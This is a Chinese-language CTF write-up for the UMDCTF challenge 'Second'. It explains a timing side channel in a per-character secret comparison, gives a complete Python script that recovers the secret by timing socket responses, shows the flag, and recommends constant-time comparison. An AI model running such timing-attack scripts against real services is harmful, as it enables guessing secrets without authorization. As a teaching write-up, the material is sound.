# Second

## 题目简述

服务生成一个 10 字符的 Base85 随机串，并逐字节比较用户猜测。每匹配一个字符就 `sleep(1)`，遇到首个错误字符才返回，因此响应时间会泄露正确前缀长度。

## 解题过程

源码中的 Base85 字符表共有 85 个字符。保持同一 TCP 连接，因为随机答案在接受连接时生成；对当前位置逐个尝试字符，响应最慢的候选就是正确字符：

```python
import socket
import time

HOST = "host"
PORT = 7799
ALPHABET = (
    "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    "abcdefghijklmnopqrstuvwxyz!#$%&()*+-;<=>?@^_`{|}~"
)

with socket.create_connection((HOST, PORT)) as sock:
    print(sock.recv(4096).decode(), end="")
    prefix = ""

    for position in range(10):
        timings = []
        for candidate in ALPHABET:
            guess = (prefix + candidate).ljust(10, "0").encode()
            started = time.perf_counter()
            sock.sendall(guess)
            response = sock.recv(4096)
            elapsed = time.perf_counter() - started
            if b"UMDCTF" in response:
                raise SystemExit(response.decode())
            timings.append((elapsed, candidate, response))

        elapsed, winner, response = max(timings)
        prefix += winner
        print(position, repr(prefix), elapsed)

    raise RuntimeError("最后一位没有触发成功响应")
```

实际网络抖动较大时，可对每个候选重复两到三次取中位数。恢复完整随机串并提交后，服务返回：

```text
UMDCTF-{y0u_r34lly_g0t_th3_t1m1ng_d0wn_d0nt_ya}
```

## 方法总结

逐字符比较必须使用恒定时间实现，否则即使结果消息完全相同，耗时也会暴露正确前缀。攻击时最重要的是复用同一会话，并用重复测量或中位数抵抗网络噪声。
